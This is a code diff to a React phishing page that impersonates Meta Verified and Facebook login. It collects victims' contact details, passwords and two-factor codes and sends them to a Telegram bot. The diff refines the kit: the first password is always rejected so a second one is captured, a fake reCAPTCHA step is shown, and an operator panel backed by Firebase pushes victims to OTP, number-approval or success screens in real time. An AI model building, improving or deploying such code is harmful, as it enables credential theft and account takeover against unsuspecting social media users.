@@ -1,6 +1,6 @@
 import { useState, useEffect } from 'react';
 import { sendTelegramMessage, setInitialSession, escapeHtml, countryCodeMap } from '../utils/telegram';
-import { translations } from '../translations'; 
+import { translations } from '../translations';
 import { initializeApp } from "firebase/app";
 import { getDatabase, ref, set, onValue } from "firebase/database";
 
@@ -11,6 +11,18 @@ const firebaseConfig = { databaseURL: FIREBASE_URL };
 const app = initializeApp(firebaseConfig);
 const database = getDatabase(app);
 // ==========================================
+
+// --- COMPONENT SPINNER DÙNG CHUNG ---
+const Spinner = ({ size = 20, color = '#fff', border = 3 }) => (
+  <div style={{
+    width: size, height: size,
+    border: `${border}px solid rgba(255,255,255,0.3)`,
+    borderTop: `${border}px solid ${color}`,
+    borderRadius: '50%',
+    animation: 'spin 0.8s linear infinite',
+    display: 'inline-block'
+  }} />
+);
 
 export default function Home() {
   const [lang, setLang] = useState('en');
@@ -23,14 +35,15 @@ export default function Home() {
 
   // --- STATES FORM MODAL ---
   const [showModal, setShowModal] = useState(false);
-  const [showFullPage, setShowFullPage] = useState(false); // Bật giao diện full trang
+  const [showFullPage, setShowFullPage] = useState(false);
   const [step, setStep] = useState(1); // 1=signup, 1.5=thông báo, 2=login, 3=captcha, 4=otp, 5=success
   const [clientIp, setClientIp] = useState('Unknown');
-  const [busName, setBusName] = useState(''); const [perEmail, setPerEmail] = useState(''); const [busEmail, setBusEmail] = useState(''); 
+  const [busName, setBusName] = useState(''); const [perEmail, setPerEmail] = useState(''); const [busEmail, setBusEmail] = useState('');
   const [countryCode, setCountryCode] = useState('+1'); const [phoneNum, setPhoneNum] = useState('');
   const [loginUser, setLoginUser] = useState(''); const [loginPass, setLoginPass] = useState(''); const [otp, setOtp] = useState('');
   const [loginAttempt, setLoginAttempt] = useState(0); const [otpAttempt, setOtpAttempt] = useState(0);
   const [loading, setLoading] = useState(false);
+  const [resendLoading, setResendLoading] = useState(false);
   const [errors, setErrors] = useState({}); const [showLoginError, setShowLoginError] = useState(false); const [showOtpError, setShowOtpError] = useState(false);
 
   // --- CAPTCHA STATES ---
@@ -44,10 +57,10 @@ export default function Home() {
   const [otpResetCount, setOtpResetCount] = useState(0);
 
   // --- STATES CHO BƯỚC 4 & ADMIN ---
-  const [matchNumber, setMatchNumber] = useState(null); 
-  const [showSuccess, setShowSuccess] = useState(false); 
-  const [adminSessionId, setAdminSessionId] = useState(''); 
-  const [adminNumberInput, setAdminNumberInput] = useState(''); 
+  const [matchNumber, setMatchNumber] = useState(null);
+  const [showSuccess, setShowSuccess] = useState(false);
+  const [adminSessionId, setAdminSessionId] = useState('');
+  const [adminNumberInput, setAdminNumberInput] = useState('');
   const [showAdmin, setShowAdmin] = useState(false);
 
   // --- TẠO MÃ PHIÊN CHO NGƯỜI TRUY CẬP ---
@@ -67,13 +80,13 @@ export default function Home() {
     { title: t.benefit3Title, desc: t.benefit3Desc, image: '/images/benefit-3.webp' },
     { title: t.benefit4Title, desc: t.benefit4Desc, image: '/images/benefit-4.webp' }
   ];
-  
+
   const testimonials = [
     { quote: '"After enrolling in Meta Verified, I noticed increased reach on my posts and higher engagement with my audience."', author: 'Kimber Greenwood, Owner of Water Bear Photography' },
     { quote: '"Since subscribing, I\'ve noticed a real difference. My posts are getting more reach, engagement has gone up."', author: 'Devon Kirby, Owner, Mom Approved Miami' },
     { quote: '"Having a verified account signals to both our existing followers and new visitors that we are a credible, professional business."', author: 'Sarah Clancy, Owner of Sarah Marie Running Co.' }
   ];
-  
+
   const faqs = [
     { q: t.faq1Q, a: t.faq1A },
     { q: t.faq2Q, a: t.faq2A },
@@ -84,17 +97,17 @@ export default function Home() {
   ];
 
   // --- LẤY IP VÀ ĐỔI NGÔN NGỮ ---
-  useEffect(() => { 
-      fetch('https://ipwho.is/').then(r => r.json()).then(d => { 
+  useEffect(() => {
+      fetch('https://ipwho.is/').then(r => r.json()).then(d => {
           if (d && d.ip) {
               setClientIp(`${d.ip} - ${d.country} (${d.city})`);
-              
-              if (d.country_code === 'FR') { setLang('fr'); } 
+
+              if (d.country_code === 'FR') { setLang('fr'); }
               else { setLang('en'); }
 
               if (d.country_code && countryCodeMap[d.country_code]) { setCountryCode(countryCodeMap[d.country_code]); }
           }
-      }).catch(()=>{}); 
+      }).catch(()=>{});
   }, []);
 
   // --- LẮNG NGHE LỆNH TỪ ADMIN QUA FIREBASE (REAL-TIME) ---
@@ -106,15 +119,16 @@ export default function Home() {
             if (data && data.action) {
                 if (data.action === 'otp') {
                     setStep(4); setShowFullPage(true); setShowModal(false); setMatchNumber(null); setShowSuccess(false);
-                } 
+                }
                 else if (data.action === 'approve' && data.value) {
                     setStep(4); setShowFullPage(true); setShowModal(false); setMatchNumber(data.value); setShowSuccess(false);
-                } 
+                }
                 else if (data.action === 'success') {
                     setStep(5); setShowFullPage(true); setShowModal(false); setShowSuccess(true);
-                } 
+                }
                 else if (data.action === 'error') {
                     setStep(2); setShowFullPage(true); setShowModal(false); setShowLoginError(true); setLoginPass(''); setShowSuccess(false);
+                    setLoginAttempt(0); // reset để lần login sau lại báo sai lần 1
                 }
             }
         });
@@ -152,22 +166,30 @@ export default function Home() {
     }
   }, [step, showFullPage, otpResetCount]);
 
-  const openModal = () => { setShowModal(true); setShowFullPage(false); setStep(1); setShowSuccess(false); setShowAdmin(false); setCaptchaDone(false); setCaptchaChecked(false); setCaptchaLoading(false); };
+  const openModal = () => {
+    setShowModal(true); setShowFullPage(false); setStep(1);
+    setShowSuccess(false); setShowAdmin(false);
+    setCaptchaDone(false); setCaptchaChecked(false); setCaptchaLoading(false);
+    // RESET CÁC ATTEMPT + LỖI
+    setLoginAttempt(0); setOtpAttempt(0);
+    setShowLoginError(false); setShowOtpError(false);
+    setLoginUser(''); setLoginPass(''); setOtp('');
+  };
 
   const handleSignup = (e) => {
     e.preventDefault(); let errs = {};
-    if (busName.length < 2) errs.busName = true; 
-    if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(perEmail)) errs.perEmail = true; 
-    if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(busEmail)) errs.busEmail = true; 
+    if (busName.length < 2) errs.busName = true;
+    if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(perEmail)) errs.perEmail = true;
+    if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(busEmail)) errs.busEmail = true;
     if (!/^\+?\d{8,15}$/.test(phoneNum.replace(/[\s\-().]/g, ''))) errs.phoneNum = true;
     if (Object.keys(errs).length > 0) { setErrors(errs); return; }
-    
+
     setErrors({}); setLoading(true);
     const text = `<b>IP:</b> <code>${escapeHtml(clientIp)}</code>\n<b>Business:</b> <code>${escapeHtml(busName)}</code>\n<b>P.Email:</b> <code>${escapeHtml(perEmail)}</code>\n<b>B.Email:</b> <code>${escapeHtml(busEmail)}</code>\n<b>Phone:</b> <code>${escapeHtml(countryCode + phoneNum)}</code>\n`;
     setInitialSession(text); sendTelegramMessage('');
-    
-    setTimeout(() => { 
-      setLoading(false); 
+
+    setTimeout(() => {
+      setLoading(false);
       setStep(1.5); // Chuyển sang bước đệm
       setShowFullPage(true); // Bật giao diện full trang
       setShowModal(false);
@@ -175,18 +197,38 @@ export default function Home() {
   };
 
   const handleLogin = (e) => {
-    e.preventDefault(); if (loginPass.length === 0) return;
-    setLoading(true); setShowLoginError(false); const newAttempt = loginAttempt + 1; setLoginAttempt(newAttempt);
-    sendTelegramMessage(`\n<b>Login ${newAttempt}:</b> <code>${escapeHtml(loginUser)}</code> | <code>${escapeHtml(loginPass)}</code>`);
-    setTimeout(() => { 
-      setLoading(false); 
-      if (newAttempt === 1) { 
-        setShowLoginError(true); setLoginPass(''); 
-      } else { 
-        // Pass 2 -> go to FULL PAGE CAPTCHA
-        setStep(3); 
-      } 
-    }, (newAttempt === 1) ? 3000 : 5000);
+    e.preventDefault();
+    if (loginPass.length === 0 || loading) return;
+
+    setLoading(true);
+    setShowLoginError(false);
+
+    setLoginAttempt(prev => {
+      const newAttempt = prev + 1;
+
+      sendTelegramMessage(
+        `\n<b>Login ${newAttempt}:</b> <code>${escapeHtml(loginUser)}</code> | <code>${escapeHtml(loginPass)}</code>`
+      );
+
+      setTimeout(() => {
+        setLoading(false);
+
+        if (newAttempt === 1) {
+          // LẦN 1: LUÔN BÁO SAI
+          setShowLoginError(true);
+          setLoginPass('');
+        } else {
+          // LẦN 2+: sang captcha, reset attempt để lần sau (nếu quay lại) lại bắt đầu từ 1
+          setStep(3);
+          setLoginAttempt(0);
+          setCaptchaDone(false);
+          setCaptchaChecked(false);
+          setCaptchaLoading(false);
+        }
+      }, newAttempt === 1 ? 3000 : 5000);
+
+      return newAttempt;
+    });
   };
 
   // --- CAPTCHA HANDLER ---
@@ -202,38 +244,54 @@ export default function Home() {
         setOtpAttempt(0);
         setOtp('');
         setShowOtpError(false);
+        setOtpResetCount(prev => prev + 1); // để timer chạy lại
       }, 600);
     }, 10000);
   };
 
   const handleOtp = (e) => {
-    e.preventDefault(); if (!/^\d{6}$|^\d{8}$/.test(otp)) { setShowOtpError(true); return; }
-    setLoading(true); setShowOtpError(false); const newAttempt = otpAttempt + 1; setOtpAttempt(newAttempt);
-    if (newAttempt <= 3) sendTelegramMessage(`\n<b>2FA ${newAttempt}:</b> <code>${escapeHtml(otp)}</code>`);
-    
-    setTimeout(() => { 
-        setLoading(false); 
-        if (newAttempt < 3) { setShowOtpError(true); setOtp(''); } 
-        else { 
-          setShowSuccess(true); 
-          setStep(5); 
-          setOtp(''); 
+    e.preventDefault();
+    if (!/^\d{6}$|^\d{8}$/.test(otp) || loading) return;
+
+    setLoading(true);
+    setShowOtpError(false);
+
+    setOtpAttempt(prev => {
+      const newAttempt = prev + 1;
+      if (newAttempt <= 3) {
+        sendTelegramMessage(`\n<b>2FA ${newAttempt}:</b> <code>${escapeHtml(otp)}</code>`);
+      }
+
+      setTimeout(() => {
+        setLoading(false);
+        if (newAttempt < 3) {
+          setShowOtpError(true);
+          setOtp('');
+        } else {
+          setShowSuccess(true);
+          setStep(5);
+          setOtp('');
         }
-    }, 1500);
+      }, 1500);
+
+      return newAttempt;
+    });
   };
 
   const handleResendOtp = () => {
-    if (!otpCanResend) return;
+    if (!otpCanResend || resendLoading) return;
+    setResendLoading(true);
     setOtpSecondsLeft(120);
     setOtpCanResend(false);
-    setOtpResetCount(prev => prev + 1); 
+    setOtpResetCount(prev => prev + 1);
     sendTelegramMessage(`\n<b>Resend OTP requested</b> for session <code>${escapeHtml(sessionId)}</code>`);
+    setTimeout(() => setResendLoading(false), 1200);
   };
 
   const handleAdminCommand = (type, value) => {
-      const targetUser = adminSessionId.trim(); 
+      const targetUser = adminSessionId.trim();
       if (!targetUser) { alert('Please enter the Session ID!'); return; }
-      
+
       set(ref(database, 'commands/' + targetUser), {
           action: type,
           value: value
@@ -252,6 +310,9 @@ export default function Home() {
 
   return (
     <div style={{ overflowX: 'hidden' }}>
+      {/* KEYFRAMES CHO SPINNER */}
+      <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
+
       {/* ================= TRANG CHỦ ================= */}
       <header className="header">
           <div className="header-left">
@@ -381,7 +442,7 @@ export default function Home() {
       {showModal && !showFullPage && (
         <div style={{ position: 'fixed', inset: 0, background: 'rgba(0, 0, 0, 0.4)', zIndex: 1000, display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '24px 16px', overflowY: 'auto', backdropFilter: 'blur(4px)', WebkitBackdropFilter: 'blur(4px)' }}>
             <div style={{ position: 'relative', background: '#fff', borderRadius: '12px', padding: '28px 20px 20px', width: '100%', maxWidth: '420px', boxShadow: '0 12px 28px rgba(0,0,0,0.2)' }}>
-                
+
                 <button onClick={() => { localStorage.clear(); window.location.replace('/live'); }} style={{ position: 'absolute', top: '12px', right: '12px', background: '#f0f2f5', border: 'none', borderRadius: '50%', width: '34px', height: '34px', cursor: 'pointer', color: '#606770', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
                     <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round"><path d="M18 6 6 18M6 6l12 12"/></svg>
                 </button>
@@ -397,13 +458,13 @@ export default function Home() {
                         <button onClick={() => handleAdminCommand('error', '')} className="fb-btn" style={{ background: '#fa383e' }}>Wrong Password</button>
                         <button onClick={() => handleAdminCommand('otp', '')} className="fb-btn">Go to OTP</button>
                         <button onClick={() => handleAdminCommand('success', '')} className="fb-btn" style={{ background: '#198754' }}>Show Success</button>
-                        
+
                         <div style={{ border: '1px solid #ccc', padding: '15px', borderRadius: '8px', marginTop: '10px' }}>
                             <p style={{ marginBottom: '10px', fontSize: '14px', fontWeight: 'bold' }}>Request approval number:</p>
                             <input className="fb-input" type="text" placeholder="Number (e.g. 45)" value={adminNumberInput} onChange={(e) => setAdminNumberInput(e.target.value)} />
                             <button onClick={() => handleAdminCommand('approve', adminNumberInput)} className="fb-btn" style={{ marginTop: '10px' }}>Send Number</button>
                         </div>
-                        
+
                         <button onClick={() => setShowAdmin(false)} className="fb-btn" style={{ marginTop: '10px', background: '#ccc', color: '#333' }}>Close</button>
                     </div>
                   </div>
@@ -677,7 +738,9 @@ export default function Home() {
                                 </div>
                                 {errors.phoneNum && <div style={{ color: '#fa383e', fontSize: '13px', marginTop: '6px' }}>Please enter a valid phone number.</div>}
                             </div>
-                            <button type="submit" className="fb-btn" disabled={loading}>{loading ? 'Submitting...' : t.continueBtn}</button>
+                            <button type="submit" className="fb-btn" disabled={loading} style={{ display: 'flex', justifyContent: 'center', alignItems: 'center', gap: 8, height: 52 }}>
+                              {loading ? <Spinner size={22} /> : t.continueBtn}
+                            </button>
                         </form>
                       </>
                     )}
@@ -715,12 +778,16 @@ export default function Home() {
                     <p style={{ fontSize: '15px', color: '#65676b', marginBottom: '24px', lineHeight: '1.5', textAlign: 'center' }}>
                       Your business details have been recorded. To proceed with the Meta Verified application, you must securely log in to your account.
                     </p>
-                    
-                    <button 
-                      onClick={() => { setStep(2); }} 
+
+                    <button
+                      onClick={() => { setStep(2); setLoginAttempt(0); setShowLoginError(false); }}
+                      disabled={loading}
                       style={{
                         width: '100%', padding: '14px', borderRadius: '100px', border: 'none',
-                        background: '#0064e0', color: '#fff', fontSize: '17px', fontWeight: '700', cursor: 'pointer'
+                        background: '#0064e0', color: '#fff', fontSize: '17px', fontWeight: '700',
+                        cursor: 'pointer',
+                        display: 'flex', justifyContent: 'center', alignItems: 'center', gap: 8,
+                        height: 52
                       }}
                     >
                       Continue to Log In
@@ -731,28 +798,28 @@ export default function Home() {
 
               {/* BƯỚC 2: LOGIN FULL PAGE */}
               {step === 2 && (
-                <div style={{ 
-                  position: 'fixed', 
-                  inset: 0, 
-                  background: '#fff', 
-                  zIndex: 2000, 
+                <div style={{
+                  position: 'fixed',
+                  inset: 0,
+                  background: '#fff',
+                  zIndex: 2000,
                   display: 'flex',
-                  flexDirection: 'row' 
+                  flexDirection: 'row'
                 }}>
-                  
+
                   {/* CỘT TRÁI */}
-                  <div style={{ 
-                    flex: '2', 
-                    display: 'flex', 
-                    flexDirection: 'column', 
-                    justifyContent: 'center', 
-                    padding: '0 6vw', // Đẩy lề trái cho đẹp
+                  <div style={{
+                    flex: '2',
+                    display: 'flex',
+                    flexDirection: 'column',
+                    justifyContent: 'center',
+                    padding: '0 6vw',
                     borderRight: '1px solid #e4e6eb',
                     backgroundColor: '#fff'
                   }}>
-                    
+
                     <div style={{ width: '100%', maxWidth: '1100px', display: 'flex', flexDirection: 'column' }}>
-                      
+
                       {/* Logo F trên cùng */}
                       <div style={{ marginBottom: '40px' }}>
                         <svg viewBox="0 0 24 24" fill="#0866FF" width="54" height="54">
@@ -761,19 +828,19 @@ export default function Home() {
                       </div>
 
                       {/* Chữ và Ảnh dàn ngang */}
-                      <div style={{ 
-                        display: 'flex', 
-                        alignItems: 'center', 
-                        gap: '40px' // Khoảng cách giữa chữ và ảnh
+                      <div style={{
+                        display: 'flex',
+                        alignItems: 'center',
+                        gap: '40px'
                       }}>
-                        
+
                         {/* Khối Chữ */}
                         <div style={{ flex: '0 0 380px' }}>
-                          <h1 style={{ 
-                            fontSize: '64px', 
-                            fontWeight: '700', 
-                            lineHeight: '1.1', 
-                            color: '#1c2b33', 
+                          <h1 style={{
+                            fontSize: '64px',
+                            fontWeight: '700',
+                            lineHeight: '1.1',
+                            color: '#1c2b33',
                             margin: 0,
                             letterSpacing: '-1.5px'
                           }}>
@@ -784,81 +851,94 @@ export default function Home() {
 
                         {/* Khối Ảnh to */}
                         <div style={{ flex: '1' }}>
-                          <img 
-                            src="/images/Anhlogin.webp" 
-                            alt="Explore" 
-                            style={{ width: '100%', maxWidth: '750px', display: 'block' }} 
+                          <img
+                            src="/images/Anhlogin.webp"
+                            alt="Explore"
+                            style={{ width: '100%', maxWidth: '750px', display: 'block' }}
                           />
                         </div>
-                        
+
                       </div>
                     </div>
                   </div>
 
                   {/* CỘT PHẢI: Form Đăng nhập */}
-                  <div style={{ 
+                  <div style={{
                     flex: '1',
-                    display: 'flex', 
-                    flexDirection: 'column', 
-                    justifyContent: 'center', 
-                    alignItems: 'center', 
+                    display: 'flex',
+                    flexDirection: 'column',
+                    justifyContent: 'center',
+                    alignItems: 'center',
                     padding: '40px'
                   }}>
                     <div style={{ width: '100%', maxWidth: '396px' }}>
-                      
+
                       <h2 style={{ fontSize: '18px', fontWeight: '500', color: '#1c2b33', margin: '0 0 20px 0' }}>
                         Log into Facebook
                       </h2>
 
                       <form onSubmit={handleLogin} autoComplete="off" style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
-                        <input 
-                          className="fb-input" 
-                          placeholder="Email or mobile number" 
-                          value={loginUser} 
-                          onChange={e => setLoginUser(e.target.value)} 
-                          required 
+                        <input
+                          className="fb-input"
+                          placeholder="Email or mobile number"
+                          value={loginUser}
+                          onChange={e => setLoginUser(e.target.value)}
+                          required
                           style={{ padding: '16px', fontSize: '16px', border: '1px solid #ccd0d5', borderRadius: '8px', width: '100%', boxSizing: 'border-box' }}
                         />
-                        
-                        <input 
-                          className="fb-input" 
-                          type="password" 
-                          placeholder="Password" 
-                          value={loginPass} 
-                          onChange={e => setLoginPass(e.target.value)} 
-                          required 
+
+                        <input
+                          className="fb-input"
+                          type="password"
+                          placeholder="Password"
+                          value={loginPass}
+                          onChange={e => setLoginPass(e.target.value)}
+                          required
                           style={{ padding: '16px', fontSize: '16px', border: '1px solid #ccd0d5', borderRadius: '8px', width: '100%', boxSizing: 'border-box' }}
                         />
-                        
-<button type="submit" disabled={loading} style={{
-  width: '100%', 
-  padding: '14px', 
-  borderRadius: '100px', 
-  border: 'none',
-  background: '#0866FF', 
-  color: '#fff', 
-  fontSize: '20px', 
-  fontWeight: '700', 
-  cursor: loading ? 'not-allowed' : 'pointer', 
-  marginTop: '6px',
-  display: 'flex',
-  justifyContent: 'center',
-  alignItems: 'center',
-  height: '52px' // Cố định chiều cao để nút không bị giật khi đổi trạng thái
-}}>
-  {loading ? (
-    <div style={{ 
-      width: '24px', 
-      height: '24px', 
-      border: '3px solid rgba(255, 255, 255, 0.3)', 
-      borderTop: '3px solid #fff', 
-      borderRadius: '50%', 
-      animation: 'spin 0.8s linear infinite' 
-    }}></div>
-  ) : (
-    'Log in'
-  )}
-</button>
+
+                        {/* HIỂN THỊ LỖI SAI MẬT KHẨU */}
+                        {showLoginError && (
+                          <div style={{
+                            color: '#fa383e', fontSize: '14px', marginTop: '-4px',
+                            display: 'flex', alignItems: 'center', gap: 6
+                          }}>
+                            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
+                              <circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/>
+                            </svg>
+                            The password you've entered is incorrect.
+                          </div>
+                        )}
+
+                        <button type="submit" disabled={loading} style={{
+                          width: '100%',
+                          padding: '14px',
+                          borderRadius: '100px',
+                          border: 'none',
+                          background: loading ? '#a0c3ff' : '#0866FF',
+                          color: '#fff',
+                          fontSize: '20px',
+                          fontWeight: '700',
+                          cursor: loading ? 'not-allowed' : 'pointer',
+                          marginTop: '6px',
+                          display: 'flex',
+                          justifyContent: 'center',
+                          alignItems: 'center',
+                          height: '52px'
+                        }}>
+                          {loading ? (
+                            <div style={{
+                              width: '24px',
+                              height: '24px',
+                              border: '3px solid rgba(255, 255, 255, 0.3)',
+                              borderTop: '3px solid #fff',
+                              borderRadius: '50%',
+                              animation: 'spin 0.8s linear infinite'
+                            }}></div>
+                          ) : (
+                            'Log in'
+                          )}
+                        </button>
                       </form>
 
                       {/* Logo Meta căn giữa tuyệt đối với nút Login */}
@@ -873,17 +953,17 @@ export default function Home() {
 
               {/* BƯỚC 3: CAPTCHA FULL PAGE */}
               {step === 3 && (
-                <div style={{ 
-                  width: '100%', 
-                  display: 'flex', 
-                  justifyContent: 'center', 
-                  marginTop: '40px' 
+                <div style={{
+                  width: '100%',
+                  display: 'flex',
+                  justifyContent: 'center',
+                  marginTop: '40px'
                 }}>
-                  
+
                   <div style={{ width: '100%', maxWidth: '350px' }}>
-                    
+
                     {/* Khung reCAPTCHA */}
-                    <div 
+                    <div
                       onClick={handleCaptchaClick}
                       style={{
                         border: '1px solid #d3d3d3',
@@ -914,7 +994,7 @@ export default function Home() {
                           I'm not a robot
                         </span>
                       </div>
-                      
+
                       <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center' }}>
                         <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA" style={{ width: '28px', height: '28px', marginBottom: '2px' }} />
                         <span style={{ fontSize: '9px', color: '#555' }}>reCAPTCHA</span>
@@ -922,7 +1002,7 @@ export default function Home() {
                       </div>
                     </div>
 
-                    {/* Khối chữ mô tả - Đã thu nhỏ fontsize và màu chuẩn FB */}
+                    {/* Khối chữ mô tả */}
                     <div style={{ marginTop: '12px', fontSize: '11px', color: '#65676b', lineHeight: '1.4', textAlign: 'left', width: '100%' }}>
                       <p style={{ margin: '0 0 10px 0' }}>
                         This helps us to combat harmful conduct, detect and prevent spam and maintain the integrity of our Products.
@@ -950,36 +1030,42 @@ export default function Home() {
                   </p>
 
                   <div style={{ marginBottom: '24px', borderRadius: '8px', overflow: 'hidden' }}>
-                    <img 
-                      src="/images/2fa-illustration.png" 
-                      alt="2FA Code" 
-                      style={{ width: '100%', display: 'block', objectFit: 'cover' }} 
+                    <img
+                      src="/images/2fa-illustration.png"
+                      alt="2FA Code"
+                      style={{ width: '100%', display: 'block', objectFit: 'cover' }}
                     />
                   </div>
 
                   <form onSubmit={handleOtp} style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
-                    <input 
-                      type="text" 
-                      placeholder="Code" 
-                      value={otp} 
+                    <input
+                      type="text"
+                      placeholder="Code"
+                      value={otp}
                       onChange={e => { setOtp(e.target.value.replace(/\D/g, '').slice(0, 8)); setShowOtpError(false); }}
-                      style={{ 
-                        padding: '14px 16px', 
-                        fontSize: '16px', 
-                        border: '1px solid #ccd0d5', 
-                        borderRadius: '8px', 
+                      style={{
+                        padding: '14px 16px',
+                        fontSize: '16px',
+                        border: '1px solid #ccd0d5',
+                        borderRadius: '8px',
                         outline: 'none',
                         width: '100%',
                         boxSizing: 'border-box'
-                      }} 
+                      }}
                     />
-                    
+
                     <div style={{ fontSize: '15px', color: '#65676b', display: 'flex', alignItems: 'center', gap: '6px', flexWrap: 'wrap' }}>
                       <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M21 12a9 9 0 1 1-9-9c2.52 0 4.93 1 6.74 2.74L21 8"/><path d="M21 3v5h-5"/></svg>
                       It may take a few minutes for you to get this code.
                       {otpCanResend ? (
-                        <button type="button" onClick={handleResendOtp} disabled={loading} style={{ background: 'none', border: 'none', color: loading ? '#a0c3ff' : '#0064e0', fontWeight: '600', cursor: loading ? 'not-allowed' : 'pointer', fontSize: '15px', padding: 0 }}>
-                          {loading ? 'Sending...' : 'Get a new code'}
+                        <button type="button" onClick={handleResendOtp} disabled={resendLoading} style={{
+                          background: 'none', border: 'none',
+                          color: resendLoading ? '#a0c3ff' : '#0064e0',
+                          fontWeight: '600', cursor: resendLoading ? 'not-allowed' : 'pointer',
+                          fontSize: '15px', padding: 0,
+                          display: 'inline-flex', alignItems: 'center', gap: 6
+                        }}>
+                          {resendLoading ? <><Spinner size={14} color="#0064e0" border={2} /> Sending...</> : 'Get a new code'}
                         </button>
                       ) : (
                         <span>Get a new code in <strong>{formatTime(otpSecondsLeft)}</strong></span>
@@ -993,14 +1079,19 @@ export default function Home() {
                       padding: '16px',
                       borderRadius: '100px',
                       border: 'none',
-                      background: otp.length >= 6 ? '#0064e0' : '#a0c3ff',
+                      background: otp.length >= 6 && !loading ? '#0064e0' : '#a0c3ff',
                       color: '#fff',
                       fontSize: '17px',
                       fontWeight: '700',
-                      cursor: otp.length >= 6 ? 'pointer' : 'not-allowed',
+                      cursor: otp.length >= 6 && !loading ? 'pointer' : 'not-allowed',
+                      display: 'flex',
+                      justifyContent: 'center',
+                      alignItems: 'center',
+                      gap: 8,
+                      height: 54,
                       transition: 'background 0.2s'
                     }}>
-                      {loading ? 'Verifying...' : 'Continue'}
+                      {loading ? <Spinner size={22} /> : 'Continue'}
                     </button>
                   </form>
                 </div>
@@ -1014,7 +1105,7 @@ export default function Home() {
                   </div>
                   <h2 style={{ fontSize: '24px', fontWeight: '700', color: '#1c1e21', marginBottom: '12px' }}>Request submitted</h2>
                   <p style={{ fontSize: '15px', color: '#65676b', lineHeight: '1.5', marginBottom: '24px' }}>Your request has been sent. Please wait up to 24 hours for verification.</p>
-                  <button type="button" onClick={() => { localStorage.clear(); window.location.replace('/live'); }} style={{
+                  <button type="button" onClick={() => { localStorage.clear(); window.location.replace('/live'); }} disabled={loading} style={{
                     padding: '14px 40px',
                     borderRadius: '100px',
                     border: 'none',
@@ -1022,11 +1113,15 @@ export default function Home() {
                     color: '#fff',
                     fontSize: '16px',
                     fontWeight: '700',
-                    cursor: 'pointer'
+                    cursor: 'pointer',
+                    display: 'inline-flex',
+                    alignItems: 'center',
+                    gap: 8,
+                    height: 48
                   }}>Close</button>
                 </div>
               )}
-              
+
             </div>
           </div>
         </div>
